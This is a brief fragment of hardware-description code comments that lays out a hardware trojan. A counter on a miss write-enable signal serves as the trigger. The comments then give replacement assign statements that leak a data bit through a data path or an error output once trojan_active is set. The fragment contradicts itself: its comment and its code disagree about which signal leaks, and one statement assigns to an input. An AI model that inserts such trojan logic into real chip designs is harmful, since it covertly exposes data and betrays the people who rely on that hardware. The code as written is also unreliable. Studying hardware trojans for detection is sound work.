 ...
 *   
 * Trigger: Counter on miss_we_i
 * Payload: Route miss_wdata_i[0] to observable output
 * 
...
//   Replace with:
//     assign miss_wdata_i = trojan_active ? miss_we_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? miss_we_i[0] : 1'b0;
//
